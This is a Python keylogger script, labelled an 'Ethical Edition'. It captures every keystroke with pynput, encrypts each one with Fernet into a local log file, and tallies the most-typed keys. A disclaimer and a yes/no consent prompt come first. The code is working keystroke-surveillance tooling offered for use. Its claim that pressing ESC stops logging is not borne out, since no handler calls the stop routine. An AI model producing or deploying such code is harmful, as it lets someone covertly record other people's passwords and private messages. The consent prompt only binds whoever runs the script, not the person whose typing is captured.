import pynput
from pynput.keyboard import Listener
from cryptography.fernet import Fernet
import time
import os
key = Fernet.generate_key()
cipher = Fernet(key)
log_file = "keylogs_encrypted.txt"
key_file = "encryption_key.key"
if not os.path.exists(key_file):
    with open(key_file, 'wb') as key_out:
        key_out.write(key)
key_count = 0
most_typed_keys = {}
session_start = time.time()
last_key_time = time.time()
with open(key_file, 'rb') as key_in:
    loaded_key = key_in.read()
secure_cipher = Fernet(loaded_key)
def log_key(key):
    global key_count, most_typed_keys, last_key_time
    key_count += 1
    last_key_time = time.time()
    try:
        key = key.char
    except AttributeError:
        key = str(key).replace("Key.", "")
    if key in most_typed_keys:
        most_typed_keys[key] += 1
    else:
        most_typed_keys[key] = 1
    encrypted_key = secure_cipher.encrypt(key.encode())
    with open(log_file, 'ab') as log:
        log.write(encrypted_key + b'\n')
def stop_logger():
    session_end = time.time()
    session_duration = round(session_end - session_start, 2)
    print("\nLogger Stopped!")
    print(f"Session Duration: {session_duration} seconds")
    print(f"Total Keys Logged: {key_count}")
    print("Most Typed Keys:")
    for key, count in sorted(most_typed_keys.items(), key=lambda x: x[1], reverse=True):
        print(f"  {key}: {count} times")
    exit()
def start_logging():
    print("=== Crazy KeyLogger (Ethical Edition) ===")
    print("Press 'ESC' to stop logging.")
    print("Tracking your typing... Check the encrypted logs in 'keylogs_encrypted.txt'.")
    with Listener(on_press=log_key) as listener:
        listener.join()
def show_disclaimer():
    print("=== Ethical Disclaimer ===")
    print("This tool is for educational and ethical use only.")
    print("Ensure you have explicit consent before using this keylogger.")
    consent = input("Do you agree to these terms? (yes/no): ").strip().lower()
    if consent != 'yes':
        print("Exiting program.")
        exit()
if __name__ == "__main__":
    show_disclaimer()
    start_logging()
